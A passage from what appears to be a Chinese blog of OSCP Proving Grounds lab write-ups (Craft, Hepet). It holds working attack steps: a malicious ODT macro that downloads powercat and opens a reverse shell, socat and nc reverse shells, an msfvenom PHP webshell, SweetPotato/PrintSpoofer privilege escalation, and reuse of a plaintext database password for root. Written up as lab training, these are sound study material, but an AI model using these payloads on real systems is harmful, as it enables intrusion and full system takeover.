<figure class="highlight json"><table><tr><td class="code"><pre><span class="line">Vulnerable to CVE<span class="number">-2021</span><span class="number">-3560</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">   /var/www/html/sites/default/config.php<span class="punctuation">:</span>  &#x27;password&#x27; =&gt; &#x27;FatPanda123&#x27;<span class="punctuation">,</span></span><br></pre></td></tr></table></figure>

<p>直接黄色背景推荐Vulnerable to CVE-2021-3560， exploit失败</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line">chmod +x poc.sh</span><br><span class="line">./poc.sh</span><br><span class="line"></span><br><span class="line"><span class="punctuation">[</span>!<span class="punctuation">]</span> Username set as <span class="punctuation">:</span> secnigma</span><br><span class="line"><span class="punctuation">[</span>!<span class="punctuation">]</span> No Custom Timing specified.</span><br><span class="line"><span class="punctuation">[</span>!<span class="punctuation">]</span> Timing will be detected Automatically</span><br><span class="line"><span class="punctuation">[</span>!<span class="punctuation">]</span> Force flag not set.</span><br><span class="line"><span class="punctuation">[</span>!<span class="punctuation">]</span> Vulnerability checking is ENABLED!</span><br><span class="line"><span class="punctuation">[</span>!<span class="punctuation">]</span> Starting Vulnerability Checks...</span><br><span class="line"><span class="punctuation">[</span>!<span class="punctuation">]</span> Checking distribution...</span><br><span class="line"><span class="punctuation">[</span>!<span class="punctuation">]</span> Detected Linux distribution as ubuntu</span><br><span class="line"><span class="punctuation">[</span>!<span class="punctuation">]</span> Checking if Accountsservice and Gnome-Control-Center is installed</span><br><span class="line"><span class="punctuation">[</span>x<span class="punctuation">]</span> ERROR<span class="punctuation">:</span> Accounts service and Gnome-Control-Center NOT found!!</span><br><span class="line"><span class="punctuation">[</span>!<span class="punctuation">]</span>  Aborting Execution!</span><br><span class="line">id</span><br><span class="line">uid=<span class="number">33</span>(www-data) gid=<span class="number">33</span>(www-data) groups=<span class="number">33</span>(www-data)</span><br></pre></td></tr></table></figure>

<p>查看config.php发现是mysql的账号密码</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line">function get_codo_db_conf() <span class="punctuation">&#123;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    $config = array (</span><br><span class="line">  &#x27;driver&#x27; =&gt; &#x27;mysql&#x27;<span class="punctuation">,</span></span><br><span class="line">  &#x27;host&#x27; =&gt; &#x27;localhost&#x27;<span class="punctuation">,</span></span><br><span class="line">  &#x27;database&#x27; =&gt; &#x27;codoforumdb&#x27;<span class="punctuation">,</span></span><br><span class="line">  &#x27;username&#x27; =&gt; &#x27;codo&#x27;<span class="punctuation">,</span></span><br><span class="line">  &#x27;password&#x27; =&gt; &#x27;FatPanda123&#x27;<span class="punctuation">,</span></span><br><span class="line">  &#x27;prefix&#x27; =&gt; &#x27;&#x27;<span class="punctuation">,</span></span><br><span class="line">  &#x27;charset&#x27; =&gt; &#x27;utf8&#x27;<span class="punctuation">,</span></span><br><span class="line">  &#x27;collation&#x27; =&gt; &#x27;utf8_unicode_ci&#x27;<span class="punctuation">,</span></span><br><span class="line">);</span><br><span class="line"></span><br><span class="line">    return $config;</span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>

<p>因为不是完整版的shell,无法执行交互式命令，查看机器上没有mysql, lua等，有perl, socat</p>
<p>测试perl -e ‘exec “&#x2F;bin&#x2F;sh”;’ 执行失败， 使用socat升级shell成功</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line"># socat</span><br><span class="line">#在本地监听：<span class="punctuation">:</span></span><br><span class="line">socat file<span class="punctuation">:</span>`tty`<span class="punctuation">,</span>raw<span class="punctuation">,</span>echo=<span class="number">0</span> tcp-listen<span class="punctuation">:</span><span class="number">4444</span></span><br><span class="line"> </span><br><span class="line">#靶机<span class="punctuation">:</span></span><br><span class="line">socat exec<span class="punctuation">:</span>&#x27;bash -li&#x27;<span class="punctuation">,</span>pty<span class="punctuation">,</span>stderr<span class="punctuation">,</span>setsid<span class="punctuation">,</span>sigint<span class="punctuation">,</span>sane tcp<span class="punctuation">:</span><span class="number">192.168</span><span class="number">.45</span><span class="number">.229</span><span class="punctuation">:</span><span class="number">4446</span></span><br></pre></td></tr></table></figure>

<p>mysql登录之后看了一圈没有有用信息</p>
<p>最后测试su root 密码FatPanda123 成功</p>
<h1 id="反思"><a href="#反思" class="headerlink" title="反思"></a>反思</h1><ol>
<li><p>时间都花在哪了，简单题做了2个小时</p>
</li>
<li><ol>
<li>收集信息，正常</li>
</ol>
</li>
<li><ol start="2">
<li>发现有漏洞版本，正常</li>
</ol>
</li>
<li><ol start="3">
<li>利用50978.py， 花了些时间最终还没有执行成功，应该先看利用路径，大概搞明白之后再利用</li>
</ol>
</li>
<li><ol start="4">
<li>www-data账号之后，提权收集信息，花了些时间，测试CVE-2021-3560，测试mysql,整体还算正常，但是应该从最明显的开始入手</li>
</ol>
</li>
</ol>
]]></content>
      <categories>
        <category>What We Do-三天打鱼</category>
        <category>OSCP</category>
        <category>PG Lab</category>
      </categories>
  </entry>
  <entry>
    <title>Proving Grounds Practice - Craft</title>
    <url>/post/20250311024753.html</url>
    <content><![CDATA[<h1 id="scan"><a href="#scan" class="headerlink" title="scan"></a>scan</h1><figure class="highlight json"><table><tr><td class="code"><pre><span class="line">PORT   STATE SERVICE REASON          VERSION</span><br><span class="line"><span class="number">80</span>/tcp open  http    syn-ack ttl <span class="number">125</span> Apache httpd <span class="number">2.4</span><span class="number">.48</span> ((Win64) OpenSSL/<span class="number">1.1</span><span class="number">.1</span>k PHP/<span class="number">8.0</span><span class="number">.7</span>)</span><br><span class="line">|_http-favicon<span class="punctuation">:</span> Unknown favicon MD5<span class="punctuation">:</span> <span class="number">556</span>F31ACD686989B1AFCF382C05846AA</span><br><span class="line">|_http-title<span class="punctuation">:</span> Craft</span><br><span class="line">|_http-server-header<span class="punctuation">:</span> Apache/<span class="number">2.4</span><span class="number">.48</span> (Win64) OpenSSL/<span class="number">1.1</span><span class="number">.1</span>k PHP/<span class="number">8.0</span><span class="number">.7</span></span><br><span class="line">| http-methods<span class="punctuation">:</span> </span><br><span class="line">|_  Supported Methods<span class="punctuation">:</span> GET HEAD POST OPTIONS</span><br></pre></td></tr></table></figure>

<p>只开放了80端口</p>
<p>whatweb</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line">WhatWeb report for http<span class="punctuation">:</span><span class="comment">//192.168.173.169:80</span></span><br><span class="line">Status    <span class="punctuation">:</span> <span class="number">200</span> OK</span><br><span class="line">Title     <span class="punctuation">:</span> Craft</span><br><span class="line">IP        <span class="punctuation">:</span> <span class="number">192.168</span><span class="number">.173</span><span class="number">.169</span></span><br><span class="line">Country   <span class="punctuation">:</span> RESERVED<span class="punctuation">,</span> ZZ</span><br><span class="line"></span><br><span class="line">Summary   <span class="punctuation">:</span> Apache<span class="punctuation">[</span><span class="number">2.4</span><span class="number">.48</span><span class="punctuation">]</span><span class="punctuation">,</span> Bootstrap<span class="punctuation">,</span> Email<span class="punctuation">[</span>admin@craft.offs<span class="punctuation">]</span><span class="punctuation">,</span> HTML5<span class="punctuation">,</span> HTTPServer<span class="punctuation">[</span>Apache/<span class="number">2.4</span><span class="number">.48</span> (Win64) OpenSSL/<span class="number">1.1</span><span class="number">.1</span>k PHP/<span class="number">8.0</span><span class="number">.7</span><span class="punctuation">]</span><span class="punctuation">,</span> OpenSSL<span class="punctuation">[</span><span class="number">1.1</span><span class="number">.1</span>k<span class="punctuation">]</span><span class="punctuation">,</span> PHP<span class="punctuation">[</span><span class="number">8.0</span><span class="number">.7</span><span class="punctuation">]</span><span class="punctuation">,</span> Script<span class="punctuation">,</span> X-Powered-By<span class="punctuation">[</span>PHP/<span class="number">8.0</span><span class="number">.7</span><span class="punctuation">]</span></span><br></pre></td></tr></table></figure>

<p>从版本都找不到可以直接利用的漏洞</p>
<p>目录扫描</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="number">200</span>      GET        <span class="number">9</span>l       <span class="number">72</span>w      <span class="number">537</span>c http<span class="punctuation">:</span><span class="comment">//192.168.173.169/upload.php</span></span><br><span class="line"><span class="number">200</span>      GET       <span class="number">54</span>l      <span class="number">134</span>w     <span class="number">1644</span>c http<span class="punctuation">:</span><span class="comment">//192.168.173.169/js/scripts.js</span></span><br><span class="line"><span class="number">200</span>      GET        <span class="number">8</span>l       <span class="number">29</span>w    <span class="number">28898</span>c http<span class="punctuation">:</span><span class="comment">//192.168.173.169/assets/favicon.ico</span></span><br><span class="line"><span class="number">200</span>      GET    <span class="number">11270</span>l    <span class="number">21648</span>w   <span class="number">207614</span>c http<span class="punctuation">:</span><span class="comment">//192.168.173.169/css/styles.css</span></span><br><span class="line"><span class="number">200</span>      GET      <span class="number">106</span>l      <span class="number">659</span>w    <span class="number">26989</span>c http<span class="punctuation">:</span><span class="comment">//192.168.173.169/assets/img/demo-image-01.jpg</span></span><br><span class="line"><span class="number">200</span>      GET      <span class="number">492</span>l     <span class="number">2733</span>w   <span class="number">186437</span>c http<span class="punctuation">:</span><span class="comment">//192.168.173.169/assets/img/demo-image-02.jpg</span></span><br><span class="line"><span class="number">200</span>      GET      <span class="number">949</span>l     <span class="number">4824</span>w   <span class="number">385662</span>c http<span class="punctuation">:</span><span class="comment">//192.168.173.169/assets/img/bg-masthead.jpg</span></span><br><span class="line"><span class="number">200</span>      GET      <span class="number">165</span>l      <span class="number">663</span>w     <span class="number">9635</span>c http<span class="punctuation">:</span><span class="comment">//192.168.173.169/</span></span><br><span class="line"><span class="number">200</span>      GET      <span class="number">165</span>l      <span class="number">663</span>w     <span class="number">9635</span>c http<span class="punctuation">:</span><span class="comment">//192.168.173.169/Index.php</span></span><br><span class="line"><span class="number">200</span>      GET       <span class="number">17</span>l       <span class="number">75</span>w     <span class="number">1196</span>c http<span class="punctuation">:</span><span class="comment">//192.168.173.169/assets/</span></span><br><span class="line"><span class="number">200</span>      GET       <span class="number">16</span>l       <span class="number">62</span>w      <span class="number">980</span>c http<span class="punctuation">:</span><span class="comment">//192.168.173.169/css/</span></span><br><span class="line"><span class="number">503</span>      GET       <span class="number">11</span>l       <span class="number">44</span>w      <span class="number">404</span>c http<span class="punctuation">:</span><span class="comment">//192.168.173.169/examples</span></span><br><span class="line"><span class="number">200</span>      GET      <span class="number">165</span>l      <span class="number">663</span>w     <span class="number">9635</span>c http<span class="punctuation">:</span><span class="comment">//192.168.173.169/index.php</span></span><br><span class="line"><span class="number">200</span>      GET       <span class="number">16</span>l       <span class="number">63</span>w      <span class="number">981</span>c http<span class="punctuation">:</span><span class="comment">//192.168.173.169/js/</span></span><br><span class="line"><span class="number">403</span>      GET       <span class="number">11</span>l       <span class="number">47</span>w      <span class="number">423</span>c http<span class="punctuation">:</span><span class="comment">//192.168.173.169/licenses</span></span><br><span class="line"><span class="number">403</span>      GET       <span class="number">11</span>l       <span class="number">47</span>w      <span class="number">423</span>c http<span class="punctuation">:</span><span class="comment">//192.168.173.169/phpmyadmin</span></span><br><span class="line"><span class="number">403</span>      GET       <span class="number">11</span>l       <span class="number">47</span>w      <span class="number">423</span>c http<span class="punctuation">:</span><span class="comment">//192.168.173.169/server-info</span></span><br><span class="line"><span class="number">403</span>      GET       <span class="number">11</span>l       <span class="number">47</span>w      <span class="number">423</span>c http<span class="punctuation">:</span><span class="comment">//192.168.173.169/server-status</span></span><br><span class="line"><span class="number">200</span>      GET       <span class="number">15</span>l       <span class="number">52</span>w      <span class="number">777</span>c http<span class="punctuation">:</span><span class="comment">//192.168.173.169/uploads/</span></span><br><span class="line"><span class="number">403</span>      GET       <span class="number">11</span>l       <span class="number">47</span>w      <span class="number">423</span>c http<span class="punctuation">:</span><span class="comment">//192.168.173.169/webalizer</span></span><br></pre></td></tr></table></figure>

<p>发现有uploads assets文件夹</p>
<p>index.php upload.php</p>
<p>直接访问uplaod.php</p>
<p><img data-src="https://thiiiiink.com/202508/asynccode-102.png.png"></p>
<h1 id="foothold"><a href="#foothold" class="headerlink" title="foothold"></a>foothold</h1><p>访问80端口，可以上传文件</p>
<p><img data-src="https://thiiiiink.com/202508/asynccode-102.png.png"></p>
<p>上传一个文件， 提示仅可上传odt文件</p>
<p><img data-src="https://thiiiiink.com/202508/asynccode-104.png.png"></p>
<p>重命名为.odt后上传, 根据提示应该是可以通过投毒的</p>
<p><img data-src="https://thiiiiink.com/202508/asynccode-103.png.png"></p>
<p>上传成功之后查看了&#x2F;uploads 和 &#x2F;assets文件夹都是空的，所以也没法通过上传webshell的方式getshell</p>
<h2 id="odt"><a href="#odt" class="headerlink" title="odt"></a>odt</h2><p>搜索odt：OpenOffice Document file</p>
<blockquote>
<p><a href="https://www.howtogeek.com/765461/what-is-an-odt-file-and-how-do-you-open-one/">https://www.howtogeek.com/765461/what-is-an-odt-file-and-how-do-you-open-one/</a></p>
</blockquote>
<p>和office一样可以通过宏文件投毒<br><a href="https://books.libreoffice.org/en/GS70/GS7013-GettingStartedWithMacros.html">https://books.libreoffice.org/en/GS70/GS7013-GettingStartedWithMacros.html</a></p>
<p>反弹shell macros:</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">Sub Main</span><br><span class="line">Shell(<span class="string">&quot;cmd /c powershell IEX(New-Object System.Net.WebClient).DownloadString(&#x27;http://192.168.45.169/powercat.ps1&#x27;);powercat -c 192.168.45.169 -p 4444 -e powershell&quot;</span>)</span><br><span class="line"></span><br><span class="line">End Sub</span><br></pre></td></tr></table></figure>

<p>等待片刻后，反弹shell成功</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line">nc -nvlp <span class="number">4444</span></span><br><span class="line">listening on <span class="punctuation">[</span>any<span class="punctuation">]</span> <span class="number">4444</span> ...</span><br><span class="line">connect to <span class="punctuation">[</span><span class="number">192.168</span><span class="number">.45</span><span class="number">.169</span><span class="punctuation">]</span> from (UNKNOWN) <span class="punctuation">[</span><span class="number">192.168</span><span class="number">.173</span><span class="number">.169</span><span class="punctuation">]</span> <span class="number">50245</span></span><br><span class="line">Windows PowerShell</span><br><span class="line">Copyright (C) Microsoft Corporation. All rights reserved.</span><br><span class="line"></span><br><span class="line">PS C<span class="punctuation">:</span>\Program Files\LibreOffice\program&gt; whoami</span><br><span class="line">whoami</span><br><span class="line">craft\thecybergeek</span><br><span class="line">PS C<span class="punctuation">:</span>\Program Files\LibreOffice\program&gt;</span><br></pre></td></tr></table></figure>

<h1 id="escalation"><a href="#escalation" class="headerlink" title="escalation"></a>escalation</h1><p>上传winpeas后收集到systeminfo信息</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line">Basic System Information</span><br><span class="line">�Check if the Windows versions is vulnerable to some known exploit https<span class="punctuation">:</span><span class="comment">//book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html#version-exploits</span></span><br><span class="line">    OS Name<span class="punctuation">:</span> Microsoft Windows Server <span class="number">2019</span> Standard</span><br><span class="line">    OS Version<span class="punctuation">:</span> <span class="number">10.0</span><span class="number">.17763</span> N/A Build <span class="number">17763</span></span><br><span class="line">    System Type<span class="punctuation">:</span> x64-based PC</span><br><span class="line">    Hostname<span class="punctuation">:</span> CRAFT</span><br><span class="line">    ProductName<span class="punctuation">:</span> Windows Server <span class="number">2019</span> Standard</span><br><span class="line">    EditionID<span class="punctuation">:</span> ServerStandard</span><br><span class="line">    ReleaseId<span class="punctuation">:</span> <span class="number">1809</span></span><br><span class="line">    BuildBranch<span class="punctuation">:</span> rs5_release</span><br><span class="line">    CurrentMajorVersionNumber<span class="punctuation">:</span> <span class="number">10</span></span><br><span class="line">    CurrentVersion<span class="punctuation">:</span> <span class="number">6.3</span></span><br><span class="line">    Architecture<span class="punctuation">:</span> AMD64</span><br><span class="line">    ProcessorCount<span class="punctuation">:</span> <span class="number">2</span></span><br><span class="line">    SystemLang<span class="punctuation">:</span> en-US</span><br><span class="line">    KeyboardLang<span class="punctuation">:</span> English (United States)</span><br><span class="line">    TimeZone<span class="punctuation">:</span> (UTC<span class="number">-08</span><span class="punctuation">:</span><span class="number">00</span>) Pacific Time (US &amp; Canada)</span><br><span class="line">    IsVirtualMachine<span class="punctuation">:</span> True</span><br><span class="line">    Current Time<span class="punctuation">:</span> <span class="number">2</span>/<span class="number">4</span>/<span class="number">2025</span> <span class="number">11</span><span class="punctuation">:</span><span class="number">22</span><span class="punctuation">:</span><span class="number">06</span> PM</span><br><span class="line">    HighIntegrity<span class="punctuation">:</span> False</span><br><span class="line">    PartOfDomain<span class="punctuation">:</span> False</span><br><span class="line">    Hotfixes<span class="punctuation">:</span> KB5003541 (<span class="number">6</span>/<span class="number">30</span>/<span class="number">2021</span>)<span class="punctuation">,</span> KB4512577 (<span class="number">9</span>/<span class="number">7</span>/<span class="number">2019</span>)<span class="punctuation">,</span> KB4535680 (<span class="number">5</span>/<span class="number">28</span>/<span class="number">2021</span>)<span class="punctuation">,</span> KB4577586 (<span class="number">5</span>/<span class="number">28</span>/<span class="number">2021</span>)<span class="punctuation">,</span> KB4580325 (<span class="number">5</span>/<span class="number">28</span>/<span class="number">2021</span>)<span class="punctuation">,</span> KB4589208 (<span class="number">5</span>/<span class="number">28</span>/<span class="number">2021</span>)<span class="punctuation">,</span> KB5003243 (<span class="number">5</span>/<span class="number">28</span>/<span class="number">2021</span>)<span class="punctuation">,</span> KB5003711 (<span class="number">6</span>/<span class="number">30</span>/<span class="number">2021</span>)<span class="punctuation">,</span> KB5004947 (<span class="number">7</span>/<span class="number">13</span>/<span class="number">2021</span>)<span class="punctuation">,</span></span><br></pre></td></tr></table></figure>

<p>priv</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line">whoami /priv</span><br><span class="line"></span><br><span class="line">PRIVILEGES INFORMATION</span><br><span class="line">----------------------</span><br><span class="line"></span><br><span class="line">Privilege Name                Description                    State</span><br><span class="line">============================= ============================== ========</span><br><span class="line">SeChangeNotifyPrivilege       Bypass traverse checking       Enabled</span><br><span class="line">SeCreateGlobalPrivilege       Create global objects          Enabled</span><br><span class="line">SeIncreaseWorkingSetPrivilege Increase a process working set Disabled</span><br></pre></td></tr></table></figure>

<p>user:</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line">Logged users</span><br><span class="line">    CRAFT\thecybergeek</span><br><span class="line">    CRAFT\apache</span><br></pre></td></tr></table></figure>

<ul>
<li>尝试了ms016-32没有成功</li>
<li>尝试获取apache 账户权限，再通过apache账户提权，进入&#x2F;xampp&#x2F;文件夹, uploads和assets都在htdocs目录下，uploads文件夹无法写入，assets有写权限</li>
<li>生成webshell上床<figure class="highlight json"><table><tr><td class="code"><pre><span class="line">msfvenom -p php/reverse_php LHOST=<span class="number">192.168</span><span class="number">.45</span><span class="number">.169</span> LPORT=<span class="number">4445</span> -f raw -o r.php</span><br></pre></td></tr></table></figure></li>
</ul>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line">    Directory<span class="punctuation">:</span> C<span class="punctuation">:</span>\xampp\htdocs</span><br><span class="line">Mode                LastWriteTime         Length Name</span><br><span class="line">----                -------------         ------ ----</span><br><span class="line">d-----         <span class="number">2</span>/<span class="number">5</span>/<span class="number">2025</span>  <span class="number">12</span><span class="punctuation">:</span><span class="number">18</span> AM                assets</span><br><span class="line">d-----        <span class="number">7</span>/<span class="number">13</span>/<span class="number">2021</span>   <span class="number">3</span><span class="punctuation">:</span><span class="number">18</span> AM                css</span><br><span class="line">d-----        <span class="number">7</span>/<span class="number">13</span>/<span class="number">2021</span>   <span class="number">3</span><span class="punctuation">:</span><span class="number">18</span> AM                js</span><br><span class="line">d-----         <span class="number">2</span>/<span class="number">5</span>/<span class="number">2025</span>   <span class="number">1</span><span class="punctuation">:</span><span class="number">30</span> AM                uploads</span><br><span class="line">-a----         <span class="number">7</span>/<span class="number">7</span>/<span class="number">2021</span>  <span class="number">10</span><span class="punctuation">:</span><span class="number">53</span> AM           <span class="number">9635</span> index.php</span><br><span class="line">-a----         <span class="number">7</span>/<span class="number">7</span>/<span class="number">2021</span>   <span class="number">9</span><span class="punctuation">:</span><span class="number">56</span> AM            <span class="number">835</span> upload.php</span><br></pre></td></tr></table></figure>

<figure class="highlight json"><table><tr><td class="code"><pre><span class="line">curl http<span class="punctuation">:</span><span class="comment">//192.168.173.169/assets/r.php</span></span><br></pre></td></tr></table></figure>

<figure class="highlight json"><table><tr><td class="code"><pre><span class="line">listening on <span class="punctuation">[</span>any<span class="punctuation">]</span> <span class="number">4445</span> ...</span><br><span class="line">connect to <span class="punctuation">[</span><span class="number">192.168</span><span class="number">.45</span><span class="number">.169</span><span class="punctuation">]</span> from (UNKNOWN) <span class="punctuation">[</span><span class="number">192.168</span><span class="number">.173</span><span class="number">.169</span><span class="punctuation">]</span> <span class="number">50419</span></span><br><span class="line">whoami</span><br><span class="line">craft\apache</span><br></pre></td></tr></table></figure>

<p>成功获取apache shell</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line">whoami /priv</span><br><span class="line"></span><br><span class="line">PRIVILEGES INFORMATION</span><br><span class="line">----------------------</span><br><span class="line"></span><br><span class="line">Privilege Name                Description                               State</span><br><span class="line">============================= ========================================= ========</span><br><span class="line">SeTcbPrivilege                Act as part of the operating system       Disabled</span><br><span class="line">SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled</span><br><span class="line">SeImpersonatePrivilege        Impersonate a client after authentication Enabled</span><br><span class="line">SeCreateGlobalPrivilege       Create global objects                     Enabled</span><br><span class="line">SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled</span><br></pre></td></tr></table></figure>

<p>上传SweetPotato和nc</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line">.\SweetPotato -a <span class="string">&quot;c:\users\public\nc.exe 192.168.45.169 4446 -e powershell&quot;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight json"><table><tr><td class="code"><pre><span class="line">nc -nvlp <span class="number">4446</span></span><br><span class="line">listening on <span class="punctuation">[</span>any<span class="punctuation">]</span> <span class="number">4446</span> ...</span><br><span class="line">connect to <span class="punctuation">[</span><span class="number">192.168</span><span class="number">.45</span><span class="number">.169</span><span class="punctuation">]</span> from (UNKNOWN) <span class="punctuation">[</span><span class="number">192.168</span><span class="number">.173</span><span class="number">.169</span><span class="punctuation">]</span> <span class="number">50655</span></span><br><span class="line">Windows PowerShell</span><br><span class="line">Copyright (C) Microsoft Corporation. All rights reserved.</span><br><span class="line"></span><br><span class="line">PS C<span class="punctuation">:</span>\Windows\system32&gt; whoami</span><br><span class="line">whoami</span><br><span class="line">nt authority\system</span><br><span class="line">PS C<span class="punctuation">:</span>\Windows\system32&gt;</span><br></pre></td></tr></table></figure>

<h1 id="反思"><a href="#反思" class="headerlink" title="反思"></a>反思</h1><ol>
<li>thecybergeek 账户没有更多方式提权时，应该尽早尝试其他账户</li>
<li>apache 提权时，要能和之前web收集的信息联系起来，不能觉得是阶段性的信息，都是有价值的</li>
<li>综合体验下来SweetPotaot更好用，实际是利用PrintSpoofer.exe</li>
</ol>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line">下载</span><br><span class="line">wget https<span class="punctuation">:</span><span class="comment">//github.com/itm4n/PrintSpoofer/releases/download/v1.0/PrintSpoofer64.exe</span></span><br><span class="line">上传</span><br><span class="line">└─$ curl http<span class="punctuation">:</span><span class="comment">//192.168.120.63/cmd.php?cmd=powershell%20iwr%20http://192.168.118.14/PrintSpoofer64.exe%20-OutFile%20C:%5CWindows%5Ctasks%5CPrintSpoofer64.exe</span></span><br><span class="line"></span><br><span class="line">利用</span><br><span class="line">curl http<span class="punctuation">:</span><span class="comment">//192.168.120.63/cmd.php?cmd=C:%5CWindows%5Ctasks%5CPrintSpoofer64.exe%20-c%20%22cmd%20/c%20powershell%20-c%20C:/Windows/Tasks/rev.ps1%22</span></span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>What We Do-三天打鱼</category>
        <category>OSCP</category>
        <category>PG Lab</category>
      </categories>
  </entry>
  <entry>
    <title>Proving Grounds Practice - Hepet</title>
    <url>/post/20250223233825.html</url>
    <content><![CDATA[<h1 id="Difficulty"><a href="#Difficulty" class="headerlink" title="Difficulty"></a>Difficulty</h1><p>Meduim</p>
<h1 id="Scan"><a href="#Scan" class="headerlink" title="Scan"></a>Scan</h1><p>autorecon 192.168.184.140</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">[*] smtp found on tcp/<span class="number">25.</span></span><br><span class="line">    smtp Mercury/<span class="number">32</span> smtpd (Mail server account Maiser)</span><br><span class="line">    enum found login: admin</span><br><span class="line"></span><br><span class="line">[*] finger found on tcp/<span class="number">79.</span></span><br><span class="line">    Mercury/<span class="number">32</span> fingerd</span><br><span class="line">    Login: Admin </span><br><span class="line"></span><br><span class="line">[*] pop3pw found on tcp/<span class="number">106.</span></span><br><span class="line">    Mercury/<span class="number">32</span> poppass service</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">[*] pop3 found on tcp/<span class="number">110.</span></span><br><span class="line">    Mercury/<span class="number">32</span> pop3d</span><br><span class="line"></span><br><span class="line">[*] msrpc found on tcp/<span class="number">135.</span></span><br><span class="line"></span><br><span class="line">[*] netbios-ssn found on tcp/<span class="number">139.</span></span><br><span class="line"></span><br><span class="line">[*] imap found on tcp/<span class="number">143.</span></span><br><span class="line">     Mercury/<span class="number">32</span> imapd <span class="number">4.62</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">[*] http found on tcp/<span class="number">443.</span></span><br><span class="line">    Apache/<span class="number">2.4</span><span class="number">.46</span> (Win64) OpenSSL/<span class="number">1.1</span><span class="number">.1</span>g PHP/<span class="number">7.3</span><span class="number">.23</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">[*] microsoft-ds found on tcp/<span class="number">445.</span></span><br><span class="line">    smb</span><br><span class="line"></span><br><span class="line">[*] http found on tcp/<span class="number">8000.</span></span><br><span class="line">    Apache/<span class="number">2.4</span><span class="number">.46</span> (Win64)</span><br><span class="line">  </span><br><span class="line">[*] ph-addressbook found on tcp/<span class="number">105.</span></span><br><span class="line"></span><br><span class="line">[*] http found on tcp/<span class="number">2224.</span></span><br><span class="line">    Mercury HTTP Services</span><br><span class="line"></span><br><span class="line">[*] unknown found on tcp/<span class="number">5040.</span></span><br><span class="line"></span><br><span class="line">[*] vnc found on tcp/<span class="number">11100.</span></span><br><span class="line">    version: <span class="number">3.8</span></span><br><span class="line"></span><br><span class="line">[*] ftp found on tcp/<span class="number">20001.</span></span><br><span class="line">    FileZilla ftpd <span class="number">0.9</span><span class="number">.41</span> beta</span><br><span class="line">    Anonymous FTP login allowed</span><br><span class="line"></span><br><span class="line">[*] unknown found on tcp/<span class="number">33006.</span></span><br><span class="line">    MariaDB</span><br><span class="line"></span><br><span class="line">[*] msrpc found on tcp/<span class="number">49664.</span></span><br><span class="line">[*] msrpc found on tcp/<span class="number">49665.</span></span><br><span class="line">[*] msrpc found on tcp/<span class="number">49666.</span></span><br><span class="line">[*] msrpc found on tcp/<span class="number">49667.</span></span><br><span class="line">[*] msrpc found on tcp/<span class="number">49668.</span></span><br><span class="line">[*] msrpc found on tcp/<span class="number">49669.</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">things to <span class="keyword">try</span></span><br><span class="line">    - mail user: admin</span><br><span class="line">    <span class="number">2224</span> reset passwd</span><br><span class="line">    <span class="number">11110</span> vnc <span class="number">3.8</span></span><br><span class="line">    <span class="number">20001</span> ftp Anonymous FTP login allowed</span><br><span class="line">       vue-blog-demo v1<span class="number">.0</span><span class="number">.0</span></span><br><span class="line"></span><br><span class="line">    <span class="number">33006</span> MariaDB </span><br><span class="line"></span><br><span class="line">    <span class="number">8000</span> has /team /fonts maybe upload</span><br></pre></td></tr></table></figure>

<h2 id="20001-ftp"><a href="#20001-ftp" class="headerlink" title="20001 ftp"></a>20001 ftp</h2><p>ftp可以匿名登录, 查看内容，看起来是网站的源码，使用lftp下载下来</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">ftp -a -A <span class="number">192.168</span><span class="number">.184</span><span class="number">.140</span> -P <span class="number">20001</span></span><br><span class="line">Connected to <span class="number">192.168</span><span class="number">.184</span><span class="number">.140</span>.</span><br><span class="line"><span class="number">220</span>-FileZilla Server version <span class="number">0.9</span><span class="number">.41</span> beta</span><br><span class="line"><span class="number">220</span>-written by Tim Kosse (Tim.Kosse@gmx.de)</span><br><span class="line"><span class="number">220</span> Please visit http://sourceforge.net/projects/filezilla/</span><br><span class="line"><span class="number">331</span> Password required <span class="keyword">for</span> anonymous</span><br><span class="line"><span class="number">230</span> Logged on</span><br><span class="line">Remote system <span class="built_in">type</span> <span class="keyword">is</span> UNIX.</span><br><span class="line">Using binary mode to transfer files.</span><br><span class="line">ftp&gt; ls</span><br><span class="line"><span class="number">200</span> Port command successful</span><br><span class="line"><span class="number">150</span> Opening data channel <span class="keyword">for</span> directory <span class="built_in">list</span>.</span><br><span class="line">-r--r--r-- <span class="number">1</span> ftp ftp            <span class="number">312</span> Oct <span class="number">20</span>  <span class="number">2020</span> .babelrc</span><br><span class="line">-r--r--r-- <span class="number">1</span> ftp ftp            <span class="number">147</span> Oct <span class="number">20</span>  <span class="number">2020</span> .editorconfig</span><br><span class="line">-r--r--r-- <span class="number">1</span> ftp ftp             <span class="number">23</span> Oct <span class="number">20</span>  <span class="number">2020</span> .eslintignore</span><br><span class="line">-r--r--r-- <span class="number">1</span> ftp ftp            <span class="number">779</span> Oct <span class="number">20</span>  <span class="number">2020</span> .eslintrc.js</span><br><span class="line">-r--r--r-- <span class="number">1</span> ftp ftp            <span class="number">167</span> Oct <span class="number">20</span>  <span class="number">2020</span> .gitignore</span><br><span class="line">-r--r--r-- <span class="number">1</span> ftp ftp            <span 